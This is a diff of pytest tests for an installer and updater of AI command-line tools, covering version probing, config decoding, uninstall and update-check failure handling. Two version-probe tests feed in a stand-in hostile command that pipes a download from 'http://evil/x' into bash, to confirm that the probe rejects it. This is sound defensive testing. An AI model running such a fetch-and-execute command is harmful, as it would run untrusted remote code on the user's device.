@@ -21,6 +21,22 @@ core = importlib.util.module_from_spec(_spec)
 _spec.loader.exec_module(core)
 
 
+@pytest.fixture(autouse=True)
+def _no_real_network(monkeypatch):
+    """Tests must be hermetic and fast: any real HTTP call is a bug.
+
+    Cases that need upstream behaviour patch `_http_json` / `_http_text`
+    themselves, and their patch is applied after this fixture, so it wins.
+    `urlopen` is covered too, so the lower-level fetch helpers cannot silently
+    reach the network either."""
+    def boom(*args, **kwargs):
+        raise AssertionError("test attempted a real network request")
+
+    monkeypatch.setattr(core, "_http_text", boom)
+    monkeypatch.setattr(core, "_http_json", boom)
+    monkeypatch.setattr(core.urllib.request, "urlopen", boom)
+
+
 # ---------------------------------------------------------------------------
 # validate_cmd
 # ---------------------------------------------------------------------------
@@ -184,21 +200,13 @@ class TestRegistryTLS:
 
 class TestPipeScriptCommand:
     def test_env_prefix_uses_env_not_nested_bash_c(self):
-        import shlex
-        # Simulate the exact construction used in _install_pipe_script
+        # Exercise the production builder (not a copy of it, which would stay
+        # green even if _install_pipe_script drifted).
         installer_env = {"GROK_BIN_DIR": "/usr/local/bin", "FLAG": "a b"}
         script_path = "/tmp/install_grok.sh"
         installer_args = '--dir "/a b"'
 
-        cmd = f"bash {shlex_quote(script_path)}"
-        if installer_env:
-            env_prefix = " ".join(
-                f"{shlex_quote(k)}={shlex_quote(v)}" for k, v in installer_env.items()
-            )
-            cmd = f"env {env_prefix} {cmd}"
-        if installer_args:
-            # shlex.split honors quoting inside installer_args
-            cmd += " " + " ".join(shlex_quote(a) for a in shlex.split(installer_args))
+        cmd = core._build_pipe_script_cmd(script_path, installer_env, installer_args)
 
         # No nested single quotes; every value individually quoted
         assert cmd.startswith("env ")
@@ -212,6 +220,9 @@ class TestPipeScriptCommand:
         assert argv[argv.index("bash") + 1] == script_path
         # Quoted installer arg survives as a single token
         assert "--dir" in argv and "/a b" in argv
+
+    def test_without_env_or_args_is_a_plain_bash_call(self):
+        assert core._build_pipe_script_cmd("/tmp/install_x.sh") == "bash /tmp/install_x.sh"
 
 
 # ---------------------------------------------------------------------------
@@ -434,15 +445,22 @@ class TestWebUIJsonAPI:
 # ---------------------------------------------------------------------------
 
 def test_registry_env_vars_only_claude_code():
+    """Policy: only Claude Code exposes AI-provider keys (its login prompt can be
+    skipped); every app may expose the generic proxy trio, which is the documented
+    escape hatch for TUN-only setups."""
     with open(os.path.join(os.path.dirname(__file__), '..', 'src', 'registry.json'), encoding='utf-8') as f:
         reg = json.load(f)
     assert 'claude-code' in reg['apps']
+    proxy_vars = {'HTTP_PROXY', 'HTTPS_PROXY', 'ALL_PROXY'}
     for aid, app in reg['apps'].items():
-        has = bool(app.get('env_vars') or app.get('optional_env_vars'))
+        exposed = set(app.get('env_vars') or []) | set(app.get('optional_env_vars') or [])
+        non_proxy = exposed - proxy_vars
+        assert app.get('optional_env_vars'), f'{aid} must expose the proxy escape hatch'
+        assert proxy_vars <= exposed, f'{aid} is missing the proxy env vars'
         if aid == 'claude-code':
-            assert has, 'claude-code must keep env vars (ANTHROPIC_API_KEY)'
+            assert non_proxy, 'claude-code must keep its Anthropic env vars'
         else:
-            assert not has, f'{aid} must not expose env vars (login is tool-internal)'
+            assert not non_proxy, f'{aid} must not expose non-proxy env vars: {sorted(non_proxy)}'
 
 
 def shlex_quote(s):
@@ -600,13 +618,15 @@ class TestVersionProbe:
     def test_probe_parses_version_cmd_output(self, monkeypatch):
         monkeypatch.setattr(core, '_capture_cmd',
                             lambda *a, **k: (True, '2.1.226 (Claude Code)\n'))
-        assert core._probe_installed_version({'version_cmd': 'claude --version'}) == '2.1.226'
+        app = {'version_cmd': 'claude --version', 'executable': 'claude'}
+        assert core._probe_installed_version(app) == '2.1.226'
 
     def test_probe_ignores_a_spurious_non_zero_exit_code(self, monkeypatch):
         # On the real device `grok --version` prints the version but exits 126;
         # the tools' own output is authoritative, not the wrapper's status.
         monkeypatch.setattr(core, '_capture_cmd', lambda *a, **k: (False, 'grok 1.0.0 (3cd0d0cbce)\n'))
-        assert core._probe_installed_version({'version_cmd': 'grok --version'}) == '1.0.0'
+        app = {'version_cmd': 'grok --version', 'executable': 'grok'}
+        assert core._probe_installed_version(app) == '1.0.0'
 
     def test_probe_retries_with_stderr_merged(self, monkeypatch):
         calls = []
@@ -618,15 +638,84 @@ class TestVersionProbe:
             return True, ''
 
         monkeypatch.setattr(core, '_capture_cmd', fake)
-        assert core._probe_installed_version({'version_cmd': 'mimo --version'}) == '0.1.10'
+        app = {'version_cmd': 'mimo --version', 'executable': 'mimo'}
+        assert core._probe_installed_version(app) == '0.1.10'
         assert calls == [False, True]
+
+    def test_probe_does_not_read_versions_out_of_error_banners(self, monkeypatch):
+        """H2: an error banner mentioning a runtime version must not be stored as
+        the tool's version (that would hide real updates)."""
+        def fake(cmd, prefixes=None, timeout=60, merge_stderr=False):
+            if merge_stderr:
+                return True, 'Error: current node v20.11.0 is not supported\n'
+            return True, ''
+
+        monkeypatch.setattr(core, '_capture_cmd', fake)
+        app = {'version_cmd': 'claude --version', 'executable': 'claude'}
+        assert core._probe_installed_version(app) is None
+
+    def test_probe_refuses_operator_chains(self, monkeypatch):
+        """M7: version_cmd runs automatically on WebUI load, so it must not be
+        usable as an arbitrary command chain."""
+        monkeypatch.setattr(core, '_capture_cmd', lambda *a, **k: (True, '1.2.3'))
+        app = {'version_cmd': 'claude --version || curl http://evil/x | bash',
+               'executable': 'claude', 'name': 'Claude Code'}
+        assert core._probe_installed_version(app) is None
+
+    def test_probe_refuses_a_command_that_is_not_its_own_executable(self, monkeypatch):
+        monkeypatch.setattr(core, '_capture_cmd', lambda *a, **k: (True, '1.2.3'))
+        app = {'version_cmd': 'curl http://evil/x', 'executable': 'claude', 'name': 'Claude Code'}
+        assert core._probe_installed_version(app) is None
 
     def test_probe_without_version_cmd_is_none(self):
         assert core._probe_installed_version({}) is None
 
+    def test_probe_allows_its_own_executable_without_registry_cache(self, tmp_path, monkeypatch):
+        """A fresh/offline install has no cache; the probe must still be allowed."""
+        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
+        monkeypatch.setattr(core, "LOCAL_REGISTRY", str(tmp_path / "missing.json"))
+        seen = {}
+
+        def fake(cmd, prefixes=None, timeout=60, merge_stderr=False):
+            seen['prefixes'] = prefixes
+            return True, '1.2.3'
+
+        monkeypatch.setattr(core, '_capture_cmd', fake)
+        app = {'version_cmd': 'foo --version', 'executable': 'foo'}
+        assert core._probe_installed_version(app) == '1.2.3'
+        assert 'foo ' in seen['prefixes']
+        assert core.validate_cmd('foo --version', seen['prefixes']) is True
+
     def test_probe_without_any_version_is_none(self, monkeypatch):
         monkeypatch.setattr(core, '_capture_cmd', lambda *a, **k: (True, 'no version here'))
         assert core._probe_installed_version({'version_cmd': 'x --version'}) is None
+
+
+class TestJsonStdoutPurity:
+    def test_stdout_to_stderr_redirects_python_and_child_output(self, capfd):
+        """`--json` must survive os.system/subprocess noise, not just print()."""
+        import subprocess
+
+        with core._stdout_to_stderr():
+            print("python-level noise")
+            subprocess.run("echo child-level noise", shell=True)
+
+        out, err = capfd.readouterr()
+        assert "python-level noise" not in out
+        assert "child-level noise" not in out
+        assert "python-level noise" in err
+        assert "child-level noise" in err
+
+    def test_list_apps_json_stays_parseable_despite_noisy_cache_load(self, tmp_path, monkeypatch, capsys):
+        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
+        monkeypatch.setattr(core, "INSTALLED_FILE", str(tmp_path / "ancli" / "installed.json"))
+        monkeypatch.setattr(core, "UPDATE_CACHE", str(tmp_path / "ancli" / ".update_cache.json"))
+        # Corrupt state: load_installed() prints a warning before any JSON is emitted.
+        os.makedirs(tmp_path / "ancli", exist_ok=True)
+        (tmp_path / "ancli" / "installed.json").write_text("{not json", encoding="utf-8")
+
+        core.list_apps_json()
+        assert json.loads(capsys.readouterr().out)["apps"] == []
 
 
 # ---------------------------------------------------------------------------
@@ -752,6 +841,7 @@ class TestUpdateCheckFlow:
                                              "installed_version": "2.1.226", "env": {}}})
         monkeypatch.setattr(core, 'run_cmd', lambda cmd: True)
         monkeypatch.setattr(core, '_probe_installed_version', lambda app, reg=None: '2.1.283')
+        monkeypatch.setattr(core, '_http_json', lambda url, timeout=15: {'tag_name': 'v2.1.283'})
 
         assert core.update_app('claude-code', registry) is True
         installed = core.load_installed()
@@ -829,3 +919,275 @@ def test_registry_declares_probe_and_official_source():
         key = required_key[spec['source']]
         if key:
             assert spec.get(key), f'{aid}: latest.{key} is required for source {spec["source"]}'
+        for field in ('executable', 'install_cmd', 'uninstall_cmd'):
+            assert app.get(field), f'{aid}: {field} is required'
+
+
+# ---------------------------------------------------------------------------
+# Fixes from the independent review (findings reproduced on device)
+# ---------------------------------------------------------------------------
+
+def _core_paths(tmp_path, monkeypatch, apps=None):
+    """Point the core at a scratch filesystem and return a small registry."""
+    monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
+    monkeypatch.setattr(core, "ROOTFS", str(tmp_path / "rootfs"))
+    monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "mod"))
+    monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
+    monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
+    monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path / "secrets"))
+    monkeypatch.setattr(core, "INSTALLED_FILE", str(tmp_path / "ancli" / "installed.json"))
+    monkeypatch.setattr(core, "UPDATE_CACHE", str(tmp_path / "ancli" / ".update_cache.json"))
+    monkeypatch.setattr(core, "LOCAL_REGISTRY", str(tmp_path / "registry-cache.json"))
+    os.makedirs(tmp_path / "ancli" / "bin", exist_ok=True)
+    os.makedirs(tmp_path / "rootfs" / "usr" / "local" / "bin", exist_ok=True)
+    return {"version": "1.2.3", "apps": apps if apps is not None else {
+        "claude-code": {"name": "Claude Code", "executable": "claude",
+                        "version_cmd": "claude --version",
+                        "update_cmd": "curl -L https://example/claude.tar.gz",
+                        "uninstall_cmd": "rm -f /usr/local/bin/claude",
+                        "latest": {"source": "github", "repo": "anthropics/claude-code"},
+                        "version": "2.1.283",
+                        "optional_env_vars": ["ANTHROPIC_API_KEY"]},
+    }}
+
+
+class TestConfigEncoding:
+    """WebUI sends percent-encoded --set values; they must be decoded on the way in
+    and repaired on disk (tools were receiving literal 'https%3A%2F%2F...')."""
+
+    def test_parse_set_env_decodes_percent_encoding(self):
+        pairs = core.parse_set_env([
+            "--set", "ANTHROPIC_BASE_URL=https%3A%2F%2Fapi.deepseek.com%2Fanthropic",
+            "--set", "ANTHROPIC_MODEL=deepseek-v4-flash",
+        ])
+        assert pairs["ANTHROPIC_BASE_URL"] == "https://api.deepseek.com/anthropic"
+        assert pairs["ANTHROPIC_MODEL"] == "deepseek-v4-flash"
+
+    def test_parse_set_env_is_idempotent_for_plain_values(self):
+        assert core.parse_set_env(["--set", "HTTP_PROXY=http://127.0.0.1:7890"])["HTTP_PROXY"] == \
+            "http://127.0.0.1:7890"
+
+    def test_migrate_decodes_stored_values_and_rewrites_secrets(self, tmp_path, monkeypatch, capsys):
+        _core_paths(tmp_path, monkeypatch)
+        core.save_installed({"claude-code": {"executable": "claude", "env": {
+            "ANTHROPIC_BASE_URL": "https%3A%2F%2Fapi.deepseek.com%2Fanthropic",
+            "ANTHROPIC_API_KEY": "sk-plain"}}})
+
+        changed = core.migrate_encoded_env()
+
+        assert changed == {"claude-code": {
+            "ANTHROPIC_BASE_URL": "https://api.deepseek.com/anthropic",
+            "ANTHROPIC_API_KEY": "sk-plain"}}
+        stored = core.load_installed()["claude-code"]["env"]
+        assert stored["ANTHROPIC_BASE_URL"] == "https://api.deepseek.com/anthropic"
+        secrets = (tmp_path / "secrets" / "claude.env").read_text()
+        assert "https://api.deepseek.com/anthropic" in secrets
+        assert "%3A" not in secrets
+        capsys.readouterr()
+
+    def test_migrate_is_a_noop_for_clean_values(self, tmp_path, monkeypatch, capsys):
+        _core_paths(tmp_path, monkeypatch)
+        core.save_installed({"claude-code": {"executable": "claude",
+                                             "env": {"ANTHROPIC_BASE_URL": "https://api.deepseek.com"}}})
+        assert core.migrate_encoded_env() == {}
+        assert not (tmp_path / "secrets" / "claude.env").exists()
+        capsys.readouterr()
+
+
+class TestReinstallKeepsConfig:
+    def test_install_common_carries_env_and_secrets_over(self, tmp_path, monkeypatch, capsys):
+        _core_paths(tmp_path, monkeypatch)
+        core.save_installed({"claude-code": {"executable": "claude", "installed_version": "2.1.226",
+                                             "version_verified": True,
+                                             "env": {"ANTHROPIC_API_KEY": "sk-keep"}}})
+        monkeypatch.setattr(core, '_probe_installed_version', lambda app, reg=None: '2.1.283')
+        app = {"name": "Claude Code", "executable": "claude", "version_cmd": "claude --version"}
+
+        core._install_proot_common("claude-code", app)
+
+        record = core.load_installed()["claude-code"]
+        assert record["env"] == {"ANTHROPIC_API_KEY": "sk-keep"}   # not wiped by a re-install
+        assert record["installed_version"] == "2.1.283"
+        assert "secrets/claude.env" in (tmp_path / "ancli" / "bin" / "claude").read_text()
+        assert "sk-keep" in (tmp_path / "secrets" / "claude.env").read_text()
+        capsys.readouterr()
+
+
+class TestUninstallFlow:
+    def _install_artifacts(self, tmp_path):
+        for path in (tmp_path / "ancli" / "bin" / "claude",
+                     tmp_path / "mod" / "system" / "bin" / "claude",
+                     tmp_path / "ksu" / "claude",
+                     tmp_path / "ap" / "claude"):
+            path.parent.mkdir(parents=True, exist_ok=True)
+            path.write_text("wrapper")
+        (tmp_path / "secrets").mkdir(parents=True, exist_ok=True)
+        (tmp_path / "secrets" / "claude.env").write_text("export K=1\n")
+
+    def test_uninstall_removes_every_injection_path_and_the_cache_entry(self, tmp_path, monkeypatch, capsys):
+        registry = _core_paths(tmp_path, monkeypatch)
+        core.save_installed({"claude-code": {"name": "Claude Code", "executable": "claude",
+                                             "installed_version": "2.1.226", "env": {}}})
+        core._save_update_cache({"ts": 1, "latest": {
+            "claude-code": {"version": "2.1.283", "source": "github:x", "error": None}}})
+        self._install_artifacts(tmp_path)
+        monkeypatch.setattr(core, 'run_cmd', lambda cmd: True)
+
+        assert core.uninstall_app("claude-code", registry) is True
+
+        assert core.load_installed() == {}
+        for path in (tmp_path / "ancli" / "bin" / "claude",
+                     tmp_path / "mod" / "system" / "bin" / "claude",
+                     tmp_path / "ksu" / "claude",
+                     tmp_path / "ap" / "claude",
+                     tmp_path / "secrets" / "claude.env"):
+            assert not path.exists(), path
+        assert 'claude-code' not in core._load_update_cache()['latest']
+        capsys.readouterr()
+
+    def test_uninstall_reports_failure_when_the_tool_command_fails(self, tmp_path, monkeypatch, capsys):
+        registry = _core_paths(tmp_path, monkeypatch)
+        core.save_installed({"claude-code": {"name": "Claude Code", "executable": "claude",
+                                             "installed_version": "2.1.226", "env": {}}})
+        monkeypatch.setattr(core, 'run_cmd', lambda cmd: False)
+
+        assert core.uninstall_app("claude-code", registry) is False
+        assert core.load_installed() == {}      # record still removed, but exit code is honest
+        capsys.readouterr()
+
+
+class TestConcurrentWrites:
+    def test_merge_does_not_resurrect_or_clobber_other_fields(self, tmp_path, monkeypatch):
+        _core_paths(tmp_path, monkeypatch)
+        core.save_installed({"a": {"installed_version": "2.0", "env": {"K": "v"},
+                                   "installed_at": "t1"},
+                             "b": {"installed_version": "9.9"}})
+
+        core._merge_installed_fields({"a": {"installed_version": "1.0", "version_verified": True},
+                                      "ghost": {"installed_version": "3.3"}})
+
+        data = core.load_installed()
+        assert data["a"]["installed_version"] == "1.0"     # this run is authoritative for it
+        assert data["a"]["version_verified"] is True
+        assert data["a"]["env"] == {"K": "v"}              # untouched fields survive
+        assert data["a"]["installed_at"] == "t1"
+        assert data["b"]["installed_version"] == "9.9"     # app installed mid-run survives
+        assert "ghost" not in data                         # uninstalled app is not resurrected
+
+    def test_check_updates_does_not_delete_an_app_installed_mid_run(self, tmp_path, monkeypatch, capsys):
+        registry = _core_paths(tmp_path, monkeypatch)
+        core.save_installed({"claude-code": {"executable": "claude",
+                                             "installed_version": "2.1.226", "env": {}}})
+
+        def probe(app, reg=None):
+            # Simulate the user installing another tool while the check is running.
+            current = core.load_installed()
+            current["opencode"] = {"executable": "opencode", "installed_version": "1.18.32"}
+            core.save_installed(current)
+            return '2.1.283'
+
+        monkeypatch.setattr(core, '_probe_installed_version', probe)
+        monkeypatch.setattr(core, '_http_json', lambda url, timeout=15: {'tag_name': 'v2.1.283'})
+
+        core.check_updates(registry)
+
+        data = core.load_installed()
+        assert "opencode" in data
+        assert data["claude-code"]["installed_version"] == "2.1.283"
+        capsys.readouterr()
+
+
+class TestCheckFailureHandling:
+    def test_failed_lookup_keeps_the_previously_resolved_version(self, tmp_path, monkeypatch, capsys):
+        registry = _core_paths(tmp_path, monkeypatch)
+        core.save_installed({"claude-code": {"executable": "claude",
+                                             "installed_version": "2.1.226", "env": {}}})
+        core._save_update_cache({"ts": 111, "latest": {
+            "claude-code": {"version": "2.1.283", "source": "github:anthropics/claude-code",
+                            "error": None}}})
+
+        def boom(url, timeout=15):
+            raise OSError('network down')
+
+        monkeypatch.setattr(core, '_probe_installed_version', lambda app, reg=None: '2.1.226')
+        monkeypatch.setattr(core, '_http_json', boom)
+
+        cache = core.check_updates(registry)
+
+        entry = cache['latest']['claude-code']
+        assert entry['version'] == '2.1.283'          # a transient outage must not wipe it
+        assert 'network down' in entry['error']
+        assert (cache['failed'], cache['succeeded']) == (1, 0)
+        capsys.readouterr()
+
+    def test_list_json_shortens_the_check_ttl_after_failures(self, tmp_path, monkeypatch, capsys):
+        _core_paths(tmp_path, monkeypatch)
+        core.save_installed({"claude-code": {"executable": "claude",
+                                             "installed_version": "2.1.226", "env": {}}})
+        core._save_update_cache({"ts": 1, "latest": {}, "failed": 2})
+
+        core.list_apps_json()
+
+        data = json.loads(capsys.readouterr().out)
+        assert data['check_ttl'] == core.CHECK_TTL_FAILED
+        assert data['check_failed'] == 2
+
+    def test_check_updates_json_reports_counts(self, tmp_path, monkeypatch, capsys):
+        registry = _core_paths(tmp_path, monkeypatch)
+        core.save_installed({"claude-code": {"executable": "claude",
+                                             "installed_version": "2.1.226", "env": {}}})
+        monkeypatch.setattr(core, 'fetch_registry', lambda: registry)
+        monkeypatch.setattr(core, '_probe_installed_version', lambda app, reg=None: '2.1.226')
+        monkeypatch.setattr(core, '_http_json', lambda url, timeout=15: {'tag_name': 'v2.1.283'})
+
+        cache = core.check_updates_json()
+
+        assert (cache['succeeded'], cache['failed']) == (1, 0)
+        capsys.readouterr()
+
+
+class TestReviewRegressions:
+    def test_four_segment_versions_are_not_truncated(self):
+        assert core._ver_tuple('1.0.0.1') == (1, 0, 0, 1)
+        assert core._update_available('1.0.0', '1.0.0.1') is True
+
+    def test_unknown_latest_source_is_reported_not_silently_static(self):
+        ver, src, err = core._latest_version({'latest': {'source': 'gitlab'}, 'version': '1.0'}, {})
+        assert ver is None and 'unknown latest.source' in err
+
+    def test_static_without_declared_version_never_uses_the_framework_version(self):
+        ver, src, err = core._latest_version({'latest': {'source': 'static'}}, {'version': '1.2.3'})
+        assert ver is None and src == 'static'
+
+    def test_text_channel_rejects_non_version_bodies(self, monkeypatch):
+        monkeypatch.setattr(core, '_http_text', lambda url, timeout=15: '<html>oops</html>')
+        ver, src, err = core._latest_version(
+            {'latest': {'source': 'text', 'urls': ['https://x/stable']}}, {})
+        assert ver is None and 'no version' in err
+
+    def test_text_channel_accepts_a_bare_version(self, monkeypatch):
+        monkeypatch.setattr(core, '_http_text', lambda url, timeout=15: 'v1.0.41\n')
+        assert core._latest_version(
+            {'latest': {'source': 'text', 'urls': ['https://x/stable']}}, {})[0] == '1.0.41'
+
+    def test_registry_declared_value_is_not_labelled_as_a_live_check(self):
+        app = {'name': 'X', 'executable': 'x', 'version_cmd': 'x --version', 'version': '1.0',
+               'latest': {'source': 'static'}}
+        info = {'installed_version': '0.9', 'version_verified': True}
+        declared = core._app_record('x', app, True, info,
+                                    {'version': '1.0', 'source': 'registry', 'error': None})
+        assert declared['cloud_checked'] is False
+        live = core._app_record('x', app, True, info,
+                                {'version': '1.0', 'source': 'github:a/b', 'error': None})
+        assert live['cloud_checked'] is True
+
+    def test_bad_cache_types_do_not_crash(self, tmp_path, monkeypatch, capsys):
+        _core_paths(tmp_path, monkeypatch)
+        os.makedirs(tmp_path / "ancli", exist_ok=True)
+        (tmp_path / "ancli" / ".update_cache.json").write_text('{"ts": 1, "latest": [1, 2]}')
+        core.save_installed({"claude-code": {"executable": "claude", "installed_version": "1.0", "env": {}}})
+
+        core.list_apps_json()          # must not raise on a hand-edited cache
+
+        assert json.loads(capsys.readouterr().out)['apps'] == []
+        assert core._load_update_cache()['latest'] == {}   # bad type normalised away
